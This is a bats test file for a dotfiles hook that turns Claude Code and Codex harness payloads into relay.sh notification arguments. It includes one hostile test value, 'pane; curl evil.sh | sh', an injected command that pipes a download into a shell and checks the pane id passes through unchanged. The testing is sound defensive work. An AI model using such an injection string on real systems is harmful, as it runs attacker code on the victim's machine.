#!/usr/bin/env bats
# relay-agent.sh is the pns hook BOTH harnesses fire: Claude Code through the
# hooks block in private_dot_claude/modify_settings.json, Codex through the
# ~/.codex/hooks.json that hooks/codex/install-hooks.sh writes. It turns a
# harness payload into the argument list relay.sh takes.
#
# WHAT THIS COSTS AND WHY IT IS SHAPED THIS WAY. Every behavior about ARGUMENT
# ASSEMBLY needs the real process, and one run costs 35-60ms depending on
# whether there is a transcript to parse, which is more than a unit test may
# spend. So the runs happen ONCE in setup_file, CONCURRENTLY (they share
# nothing but a tmpdir, and each writes its own files), and a test reads a
# recording instead of spawning anything. The reply-shaping behaviors need no
# process at all: pns_flatten_reply lives in the decision core, so those tests
# source it, exactly as pns-event.bats does for relay.sh's decisions.
#
# RELAY_SUMMARIZING is set for every run. It is the hook's own re-entry guard,
# and it keeps the optional `codex exec` summarizer out of a unit test, which
# would otherwise be a network round trip on any machine that has codex.

setup_file() {
  export HOOK="$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/hooks/executable_relay-agent.sh"
  # A hostile environment must not reach the hook: PNS_HELPERS_DIR would
  # repoint the decision core, and the other three steer the summarizer this
  # file deliberately does not exercise.
  unset PNS_HELPERS_DIR RELAY_AGENT CODEX_BIN RELAY_CODEX_HOME
  export RELAY_SUMMARIZING=1
  export HERDR_PANE_ID='pane; curl evil.sh | sh'

  # relay.sh stands in as a stub that records the argument list it was handed,
  # NUL separated so a value carrying a space or a newline reads back intact.
  export RELAY_BIN="$BATS_FILE_TMPDIR/relay-stub.sh"
  printf '#!/usr/bin/env bash\nprintf "%%s\\0" "$@" >"$RELAY_ARGV_OUT"\n' >"$RELAY_BIN"
  chmod +x "$RELAY_BIN"
  printf '#!/usr/bin/env bash\nexit 9\n' >"$BATS_FILE_TMPDIR/failing-relay.sh"
  chmod +x "$BATS_FILE_TMPDIR/failing-relay.sh"

  # Two turns, so "the LAST turn" is a claim the fixture can falsify.
  cat >"$BATS_FILE_TMPDIR/two-turns.jsonl" <<'TRANSCRIPT'
{"type":"user","message":{"content":"the first question"}}
{"type":"assistant","message":{"content":[{"type":"text","text":"STALE, from the previous turn."}]}}
{"type":"user","message":{"content":"the second question"}}
{"type":"assistant","message":{"content":[{"type":"text","text":"Ran the suite and it passed."}]}}
TRANSCRIPT
  printf 'this is not json\nand neither is this\n' >"$BATS_FILE_TMPDIR/not-json.jsonl"
  : >"$BATS_FILE_TMPDIR/empty.jsonl"
  printf '{"type":"user","message":{"content":"q"}}\n' >"$BATS_FILE_TMPDIR/unreadable.jsonl"
  chmod 000 "$BATS_FILE_TMPDIR/unreadable.jsonl"

  # cwd is a path that does NOT exist on purpose: the project name is derived
  # from the string, and a real directory would fork git for a branch as well.
  capture done_turn 'done' "$(payload_with "$BATS_FILE_TMPDIR/two-turns.jsonl")" &
  capture blocked_state 'blocked' "$(payload_with '' 'permission to run brew')" &
  capture asked_state 'asked' "$(payload_with '' 'which of the two?')" &
  capture plan_ready_state 'plan-ready' "$(payload_with '' 'the plan is ready')" &
  capture not_json 'done' "$(payload_with "$BATS_FILE_TMPDIR/not-json.jsonl")" &
  capture empty_transcript 'done' "$(payload_with "$BATS_FILE_TMPDIR/empty.jsonl")" &
  capture unreadable 'done' "$(payload_with "$BATS_FILE_TMPDIR/unreadable.jsonl")" &
  capture absent_transcript 'done' "$(payload_with /no/such/transcript.jsonl 'the payload said so')" &
  RELAY_BIN="$BATS_FILE_TMPDIR/failing-relay.sh" capture relay_failed 'done' "$(payload_with '')" &
  PNS_HELPERS_DIR="$BATS_FILE_TMPDIR/no-such-helpers" capture no_core 'done' "$(payload_with '')" &
  wait
}

teardown_file() {
  chmod 644 "$BATS_FILE_TMPDIR/unreadable.jsonl" 2>/dev/null || true
}

setup() {
  # shellcheck source=dot_local/libexec/pns/helpers/event.sh
  source "$BATS_TEST_DIRNAME/../../dot_local/libexec/pns/helpers/event.sh"
}

# payload_with <transcript_path> [message]: one harness hook payload.
payload_with() {
  jq -cn --arg t "${1:-}" --arg m "${2:-}" \
    '{cwd: "/nowhere/webdavis/dotfiles"}
     + (if $t == "" then {} else {transcript_path: $t} end)
     + (if $m == "" then {} else {message: $m} end)'
}

# capture <name> <state> <payload>: run the hook once, keep its argv and status.
capture() {
  local name="$1" state="$2" payload="$3" status=0
  printf '%s' "$payload" |
    RELAY_ARGV_OUT="$BATS_FILE_TMPDIR/$name.argv" "$HOOK" "$state" \
      >"$BATS_FILE_TMPDIR/$name.out" 2>"$BATS_FILE_TMPDIR/$name.err" || status=$?
  printf '%s' "$status" >"$BATS_FILE_TMPDIR/$name.status"
}

# flag <name> <flag>: the value relay.sh was handed for <flag>, or non-zero.
flag() {
  local name="$1" want="$2" i
  local -a argv=()
  [[ -s "$BATS_FILE_TMPDIR/$name.argv" ]] || return 1
  mapfile -d '' -t argv <"$BATS_FILE_TMPDIR/$name.argv"
  for ((i = 0; i < ${#argv[@]}; i++)); do
    if [[ ${argv[i]} == "$want" ]]; then
      printf '%s' "${argv[i + 1]-}"
      return 0
    fi
  done
  return 1
}

# refute_flag <name> <flag>: fail, loudly, if relay.sh was handed <flag>.
# Written as a plain call rather than `! flag ...` because bats and errexit
# both ignore an inverted pipeline, which is how a refutation goes dead.
refute_flag() {
  local value
  if value="$(flag "$1" "$2")"; then
    printf 'expected no %s, got %s\n' "$2" "$value" >&2
    return 1
  fi
  return 0
}

exit_status() { cat "$BATS_FILE_TMPDIR/$1.status"; }

# --- the state the harness names --------------------------------------------

@test "the state the harness names reaches relay as --state, unchanged" {
  [ "$(flag done_turn --state)" = "done" ]
  [ "$(flag blocked_state --state)" = blocked ]
  [ "$(flag asked_state --state)" = asked ]
  [ "$(flag plan_ready_state --state)" = plan-ready ]
}

# --- what the notification says ---------------------------------------------

@test "the summary is the assistant text of the transcript's LAST turn" {
  [ "$(flag done_turn --detail)" = "Ran the suite and it passed." ]
}

@test "the project name is the last segment of the payload's cwd" {
  [ "$(flag done_turn --project)" = dotfiles ]
}

@test "the herdr pane id reaches relay verbatim, hostile value and all" {
  # Verbatim is the contract: relay.sh sanitizes the pane once, for every
  # channel (pns_pane_is_safe), so a hook that scrubbed it here would be the
  # second copy of that guard, and copies of a guard rot apart.
  [ "$(flag done_turn --pane)" = 'pane; curl evil.sh | sh' ]
}

@test "an absent transcript falls back to the summary the payload carried" {
  [ "$(flag absent_transcript --detail)" = "the payload said so" ]
}

@test "a transcript with no readable turn in it still notifies, with no summary" {
  # Each case asserts the notification WENT OUT (--state arrived) as well as
  # carrying no summary. Without that half the refutation passes for the worst
  # possible reason: a hook that died before it ever called relay.
  local name
  for name in not_json empty_transcript unreadable; do
    [ "$(flag "$name" --state)" = "done" ]
    refute_flag "$name" --detail
  done
}

# --- the exit contract -------------------------------------------------------

@test "nothing that goes wrong building a notification fails the harness turn" {
  # Both ends of the hook: relay itself exiting non-zero, and the decision core
  # the hook sources being absent. Exit 0 is the whole contract, because a
  # notification is not worth a red turn in the harness that asked for it.
  [ "$(exit_status relay_failed)" = 0 ]
  [ "$(exit_status no_core)" = 0 ]
}

# --- pns_flatten_reply, the reply shaping, called directly -------------------

@test "a multi-line reply is flattened to one space-separated line" {
  [ "$(pns_flatten_reply "$(printf '  first\nsecond\twith   runs \n')")" = "first second with runs" ]
}

@test "a reply that mentions a glob is not expanded against the filesystem" {
  # The flatten splits on whitespace, and splitting is also where bash would
  # glob. A turn that says it deleted *.jsonl must not arrive at the phone as
  # the contents of whatever directory the hook happened to run in, so this
  # runs somewhere that HAS files the pattern matches.
  cd "$BATS_FILE_TMPDIR" || return 1
  [ "$(pns_flatten_reply 'removed *.jsonl')" = 'removed *.jsonl' ]
}

@test "only an over-long reply is cut, and it is cut to its TAIL" {
  [ "$(pns_flatten_reply 'short enough' 8000)" = "short enough" ]
  [ "$(pns_flatten_reply 'abcdefghij' 4)" = ghij ]
}
